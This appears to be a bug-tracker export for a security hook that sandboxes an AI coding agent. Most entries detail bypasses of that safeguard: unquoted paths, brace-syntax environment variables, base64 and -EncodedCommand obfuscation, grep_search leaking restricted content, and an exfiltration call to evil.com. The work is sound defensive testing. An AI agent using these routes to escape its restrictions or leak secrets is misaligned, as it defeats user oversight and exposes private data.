Steps to Reproduce: 1. Issue three simultaneous denied tool calls. 2. Issue a second batch of three simultaneous denied calls 100–200ms later. 3. Observe deny counter: first batch = 1 block; second batch = 2 blocks.
Expected Behaviour: Three parallel denied calls always share a single block increment regardless of batch timing
Actual Behaviour: Second parallel batch of 3 splits across two blocks when any call arrives after the 100ms window
Comments: Found during v3.3.6 agent feedback testing. Fix: increase _DENY_BATCH_WINDOW_MS to 500.

Title: .github/agents/README.md missing — agents get file-not-found instead of useful content
Description: AGENT-RULES §3 allows read_file in .github/agents/. copilot-instructions.md states 'Specialist agents are in .github/agents/'. However .github/agents/ contains only the 7 .agent.md files and no README.md. Agents trying to discover available agents by reading .github/agents/README.md receive a file-not-found error which may be confused with a denial.
Steps to Reproduce: 1. Attempt read_file on .github/agents/README.md. 2. Observe file-not-found error rather than a denial or useful content.
Expected Behaviour: A README.md exists in .github/agents/ listing the available specialist agents
Actual Behaviour: File-not-found error returned when reading .github/agents/README.md
Comments: Found during v3.3.6 agent feedback testing.

Title: Newly created workspaces have no .git repository — all AGENT-RULES §5 git operations fail
Description: project_creator.py does not call git init after creating the workspace. AGENT-RULES §5 documents a full set of permitted git operations but all of them produce 'fatal: not a git repository' on a freshly created workspace. The entire git rules section is non-functional until the user manually runs git init.
Steps to Reproduce: 1. Create a new workspace with the launcher. 2. Open the workspace in VS Code. 3. Run git status in the terminal. 4. Observe: fatal: not a git repository.
Expected Behaviour: git status returns clean working tree on freshly created workspace; git history shows initial commit
Actual Behaviour: git status returns fatal: not a git repository
Comments: Found during v3.3.6 agent feedback testing.

Title: grep_search without includePattern leaks NoAgentZone content
Description: grep_search called with no includePattern parameter bypasses zone enforcement and returns full content from NoAgentZone. The security gate validate_grep_search() returns allow when no filePath or includePattern is present, trusting VS Code search.exclude to filter restricted zones. However search.exclude is not a hard security boundary and grep_search results include NoAgentZone file content. The bypass is precisely isolated: only grep_search with no includePattern leaks.
Steps to Reproduce: 1. Open a workspace created by the launcher. 2. Use grep_search with a query matching NoAgentZone content and no includePattern. 3. Observe: results include NoAgentZone file content that should be denied.
Expected Behaviour: grep_search without includePattern should not return content from NoAgentZone or other denied zones.
Actual Behaviour: grep_search without includePattern returns full NoAgentZone content, bypassing zone enforcement.

Title: Terminal hook: shlex posix=True consumes Windows backslashes in unquoted paths
Description: shlex.shlex(segment, posix=True) in _tokenize_segment() treats backslash as escape char. Unquoted Windows paths like C:\Users\angel become C:Usersangel after tokenization. _is_path_like() returns False (no / or \ left), so _check_path_arg() skips zone check entirely. All unquoted absolute Windows paths bypass the security gate.
Steps to Reproduce: 1. Run terminal command: Get-Content C:\Users\angel\AppData\Local\settings.json (no quotes). 2. Observe command executes without denial.
Expected Behaviour: Security gate denies the command because the path is outside the project folder.
Actual Behaviour: Command executes successfully. The mangled token passes _is_path_like() check as non-path.
Comments: Root cause of all T03-T07 bypass tests in security-hook-report.md. Affects NoAgentZone which is fully compromised via unquoted absolute paths.

Title: Terminal hook: allow_arbitrary_paths skips dollar-sign env var check
Description: The dollar-sign denial check in _validate_args() step 5 is gated behind if rule.path_args_restricted or not rule.allow_arbitrary_paths. Commands with allow_arbitrary_paths=True (write-output, echo, write-host) skip this block entirely. Write-Output $env:USERNAME passes unchecked and leaks credentials.
Steps to Reproduce: 1. Run terminal command: Write-Output $env:USERNAME. 2. Observe the username is returned without denial.
Expected Behaviour: Security gate denies the command because $env: references are dangerous regardless of command type.
Actual Behaviour: $env:USERNAME value returned to agent. No denial, no user notification.
Comments: Affects all commands with allow_arbitrary_paths=True. Test T10 in security-hook-report.md.

Title: File-tool denials invisible to user - no audit trail
Description: When the security gate denies a file tool call (read_file, list_dir, etc.), the deny decision is returned only as a JSON tool result to the agent model context. No VS Code UI notification is shown and no persistent log is written. A user cannot tell if an agent attempted restricted access unless inspecting debug logs.
Steps to Reproduce: 1. Agent calls read_file on NoAgentZone/README.md. 2. Hook returns deny. 3. Check VS Code UI for any warning notification.
Expected Behaviour: A visible notification or persistent audit log entry is created for the user.
Actual Behaviour: No notification. Denial only visible in model context debug logs.
Comments: All 10 file-tool tests in security-hook-report.md show Sichtbar im UI = No.

Title: Bash/PS1 fallback hooks share unquoted-path and obfuscation vulnerabilities
Description: The bash (require-approval.sh) and PowerShell (require-approval.ps1) fallback hooks in .github/hooks/scripts/ use regex-based command filtering analogous to security_gate.py. They likely share the unquoted-path bypass. Additionally, both shells offer obfuscation vectors not covered by regex: bash has command substitution, heredocs, base64/eval, glob expansion, process substitution; PowerShell has variable-based path construction, Invoke-Expression, Join-Path, splatting, and .NET type accelerators like [IO.File]::ReadAllText().
Steps to Reproduce: 1. In a bash-based workspace, run: cat /path/to/NoAgentZone/secret (unquoted). 2. Observe whether the hook blocks it.
Expected Behaviour: All path forms (quoted and unquoted) are denied for restricted zones in both shell variants.
Actual Behaviour: Unquoted paths likely bypass in both shells (confirmed for PS1 via security_gate.py analysis; inferred for bash by code architecture analogy).
Comments: Behavioral analysis only - hook source code is in denied zone. See Bug 7 analysis in Minimal_Agent_Feedback-3.3.8.md.

Title: security_gate: PS brace syntax bypasses SAF-069 env-var guard
Description: The SAF-069 guard in _validate_args() checks for dollar-sign-env-colon substring in each token. PowerShell brace syntax like dollar-sign-brace-env-colon-VARNAME-brace is equivalent but inserts a curly brace between dollar-sign and env-colon, so the substring match fails. echo dollar-brace-env-colon-USERNAME-brace is allowed, leaking credentials.
Steps to Reproduce: 1. Submit: echo dollar-brace-env-colon-USERNAME-brace. 2. Gate returns allow. 3. USERNAME echoed to terminal.
Expected Behaviour: Gate denies any PS env-var reference including brace syntax.
Actual Behaviour: Brace syntax is allowed by the guard — bypass confirmed in T08 of test_saf069.py.
Comments: Found during SAF-069 Tester review. Fix applied in SAF-069 iteration 2: guard extended to also check dollar-brace-env-colon pattern. Verified in T08 and T14.

Title: security_gate: PS brace syntax ${env:VAR} bypasses SAF-069 env-var guard
Description: The SAF-069 guard in _validate_args() checks for '$env:' substring in each token (case-insensitive). PowerShell also supports the brace syntax ${env:VARNAME} which expands the same environment variable. When the token '${env:USERNAME}' is tokenized the guard checks for '$env:' but the token is '${env:USERNAME}' — with a curly brace between '$' and 'env:' — so the substring does not match, the token passes the guard, and the command is allowed. Confirmed with test T08 in tests/SAF-069/test_saf069.py.
Steps to Reproduce: 1. Submit terminal command: echo ${env:USERNAME}. 2. Security gate returns allow. 3. PowerShell expands ${env:USERNAME} and echoes the username.
Expected Behaviour: Security gate denies any PS env-var reference including brace syntax ${env:VARNAME}.
Actual Behaviour: ${env:USERNAME} is allowed by the guard. The substring '$env:' is absent from '${env:username}' (the '{' breaks the match), so the guard returns False and does not deny the command.
Comments: Discovered during SAF-069 Tester review. Test T08 in tests/SAF-069/test_saf069.py reproduces the bypass. Fix: extend the guard to also check '${env:' pattern (e.g. 'if "$env:" in tok.lower() or "${env:" in tok.lower()'). Both patterns must be denied.

Title: _audit_deny calls _load_state when counter disabled, breaking SAF-036 invariant
Description: _audit_deny (SAF-072) calls _load_state for fallback SID resolution even when counter_enabled=False. Violates SAF-036 invariant that _load_state is never called when counter disabled.
Steps to Reproduce: Run py -m pytest tests/SAF-036/test_saf036_counter_config.py::TestDisabledCounter::test_disabled_counter_no_state_file_written with SAF-072 security_gate.py. Test fails: _load_state called 1 time.
Expected Behaviour: _load_state not called when counter disabled
Actual Behaviour: _audit_deny calls _load_state for fallback SID regardless of counter state

Title: require-approval.sh: curly-brace env-var bypass in SAF-073 deny guard
Description: SAF-073 env-var guard pattern matches dollar-varname but not dollar-brace-varname-brace. Both forms expand variables in bash.
Steps to Reproduce: 1. Send terminal command containing dollar-brace-HOME-brace. 2. Hook returns ask instead of deny.
Expected Behaviour: deny
Actual Behaviour: ask - curly-brace form bypasses the guard
Comments: Analogous to BUG-177/BUG-178. Fix: extend regex to also match dollar-brace-varname-brace syntax.

Title: require-approval.sh: base64 -d short flag bypasses SAF-073 obfuscation deny guard
Description: SAF-073 obfuscation guard matches the pattern base64.*decode which catches the long flag --decode but not the POSIX short flag -d. Both flags perform the same decoding operation.
Steps to Reproduce: 1. Send terminal command: echo aGVsbG8= | base64 -d. 2. Hook returns ask instead of deny.
Expected Behaviour: deny
Actual Behaviour: ask - short flag -d bypasses the obfuscation guard
Comments: Fix: extend pattern to base64.*(-d|--decode) or use a simpler base64 keyword match without requiring the flag.

Title: require-approval.ps1: .NET network type accelerators not blocked
Description: SAF-074 added .NET type accelerator blocking for IO.* and Reflection.* namespaces but did not include network namespaces. [System.Net.WebClient]::new().DownloadString() and [System.Net.Http.HttpClient]::new() are valid exfiltration vectors that bypass all PS1 hook deny patterns and return ask. Similarly Invoke-WebRequest and Invoke-RestMethod are not blocked.
Steps to Reproduce: 1. Submit run_in_terminal: [System.Net.WebClient]::new().DownloadString('https://evil.com'). 2. Hook returns ask. 3. Agent can exfiltrate data via .NET HTTP.
Expected Behaviour: deny
Actual Behaviour: ask — network type accelerators bypass all deny patterns
Comments: Fix: extend .NET type accelerator regex to also match [(system.)?net.(webclient|httpclient|webrequest)] and add Invoke-WebRequest/Invoke-RestMethod to deny patterns.

Title: require-approval.ps1: PowerShell -EncodedCommand flag not blocked
Description: SAF-074 added obfuscation blocking for eval, base64 --decode, base64 -d, and hex escapes. The PowerShell-specific -EncodedCommand (or -enc) flag passes a base64-encoded script block directly to powershell.exe for execution, bypassing all pattern-based detection. Any deny-zone access or malicious command can be base64-encoded and executed via: powershell -EncodedCommand <b64string>.
Steps to Reproduce: 1. Submit run_in_terminal: powershell -EncodedCommand dQBuAGEAdQB0AGgAbwByAGkAeQBlAGQA. 2. Hook returns ask. 3. The encoded command executes without review.
Expected Behaviour: deny
Actual Behaviour: ask — -EncodedCommand/-enc flag bypasses all deny patterns
Comments: Fix: add pattern matching for -encodedcommand and -enc flags to the obfuscation deny block in require-approval.ps1.

Title: require-approval.ps1: hex escape detection broken by backslash normalization
Description: SAF-074 added regex \\x[0-9a-f]{2} to detect hex escape sequences. However this pattern runs after the normalization step which converts all backslashes to forward-slashes. The JSON-encoded \\x41 becomes /x41 after normalization so the regex \\x[0-9a-f]{2} never matches. Low severity: PowerShell does not natively use \\x escapes (it uses backtick), so this pattern has no real-world PS attack surface, but the dead code misrepresents test coverage.
Steps to Reproduce: 1. Submit run_in_terminal: echo '\\x41\\x42'. 2. Hook returns ask instead of deny. 3. The \\x pattern never fires.
Expected Behaviour: deny (or removal of dead pattern)
Actual Behaviour: ask — backslash is normalized to / before regex check
Comments: Fix: either remove the dead \\x pattern from PS1 hook (since \\x is not a PS escape), or run the hex check on the raw INPUT_JSON before normalization.

Title: Integrity hash check is platform-dependent (CRLF vs LF)
Description: verify_file_integrity() in security_gate.py computes SHA256 from raw file bytes including line endings. update_hashes.py embeds hashes computed on Windows (CRLF). CI builds on macOS/Linux produce template files with LF endings causing permanent hash mismatch. ALL tool calls are blocked.
Steps to Reproduce: 1. Build launcher on CI (Linux/macOS). 2. Install and create a workspace. 3. Open workspace in VS Code. 4. Any agent tool call triggers security_gate.py. 5. verify_file_integrity() computes LF-based hash but compares against CRLF-based embedded hash.
Expected Behaviour: Integrity check passes on all platforms
Actual Behaviour: Integrity check fails on non-Windows platforms. All tool calls denied with SECURITY ALERT message.

Title: SAF-022/025/052 hash tests broken after SAF-075: CRLF renormalize not run
Description: SAF-075 embeds LF-normalized hashes but files still have CRLF on disk.
Steps to Reproduce: Run pytest tests/SAF-022/ tests/SAF-025/ tests/SAF-052/ and observe 7 FAILED hash-sync tests
Expected Behaviour: All hash-sync tests pass
Actual Behaviour: 7 tests fail: embedded SHA256-LF != test-computed SHA256-CRLF

Title: README --update-snapshots procedure documents non-functional command
Description: README tests/snapshots/README.md Step 2 of the update procedure documents pytest tests/snapshots/ -v --update-snapshots which fails with unrecognized arguments.
Steps to Reproduce: Run: .venv\Scripts\python.exe -m pytest tests/snapshots/ -v --update-snapshots
Expected Behaviour: Command runs and updates snapshot files
Actual Behaviour: ERROR: unrecognized arguments: --update-snapshots. The option is only registered in tests/snapshots/security_gate/conftest.py and not available at the tests/snapshots/ parent scope.

Title: planner.agent.md: residual 'edit CSVs' missed in MNT-019
Description: planner.agent.md line 15 still says 'edit CSVs' instead of 'edit JSONL data files'. WP committed to updating all format descriptions/operational instructions from CSV to JSONL.
Steps to Reproduce: 1. Open .github/agents/planner.agent.md. 2. Check line 15 description paragraph. 3. Observe 'edit CSVs' still present.
Expected Behaviour: Text reads 'edit JSONL data files'
Actual Behaviour: Text reads 'edit CSVs'

Title: DOC-010 test uses fragile HEAD~2 git ref causing failure when src/ changes are recent
Description: tests/DOC-010/test_doc010_tester_edge_cases.py::TestSourceCodeUnmodified::test_src_directory_not_modified_by_wp uses git diff HEAD~2 HEAD -- src/ to verify DOC-010 did not modify source code. This fragile relative git reference breaks whenever any commit touching src/ appears within the last 2 commits.
Steps to Reproduce: 1. Commit any change to src/ (e.g. FIX-106 modifying build_dmg.sh). 2. Run pytest tests/DOC-010/test_doc010_tester_edge_cases.py::TestSourceCodeUnmodified::test_src_directory_not_modified_by_wp.
Expected Behaviour: Test passes because DOC-010 (a research WP) did not modify src/.
Actual Behaviour: Test fails because HEAD~2..HEAD includes FIX-106's src/installer/macos/build_dmg.sh change, even though DOC-010 is not recent.
Comments: Fix: use a fixed commit range or skip test when src/ changes are from a different WP. Short-term fix: add to regression-baseline.json.

Title: FIX-103 changed known_failures from dict to list breaking DOC-051 schema tests
Description: FIX-103 reduced the regression baseline from 578 to 147 entries but changed the known_failures field from a dict (with reason sub-objects) to a plain list of test IDs. This breaks the DOC-051 schema conformance tests.
Steps to Reproduce: 1. Run python -m pytest tests/DOC-051/ --tb=short -q 2. Observe 2 failures: test_regression_baseline_has_known_failures_field and test_regression_baseline_each_entry_has_reason
Expected Behaviour: known_failures remains a dict with {test_id: {reason: ...}} structure after entry removal
Actual Behaviour: known_failures is now a flat list of test ID strings, failing isinstance(data['known_failures'], dict) check

Title: Pre-existing test subprocess.run calls missing timeout= parameter
Description: Multiple test files contain subprocess.run() calls without a timeout= parameter. These are not recursion risks but violate testing-protocol.md rule 8. The 30-second pytest-timeout provides a global backstop.
Steps to Reproduce: 1. Search tests/ for subprocess.run without timeout= parameter
Expected Behaviour: All subprocess.run calls in test files include timeout= parameter per rule 8 of testing-protocol.md
Actual Behaviour: ~20+ calls across tests/DOC-010, tests/FIX-011, tests/FIX-052, tests/FIX-084, tests/FIX-097, tests/FIX-102, tests/FIX-105, tests/FIX-111, tests/INS-001, tests/INS-012 and more lack timeout=
Comments: None of these invoke pytest recursively. Low severity because pytest-timeout=30s backstop is now in place. Follow-up FIX WP recommended.
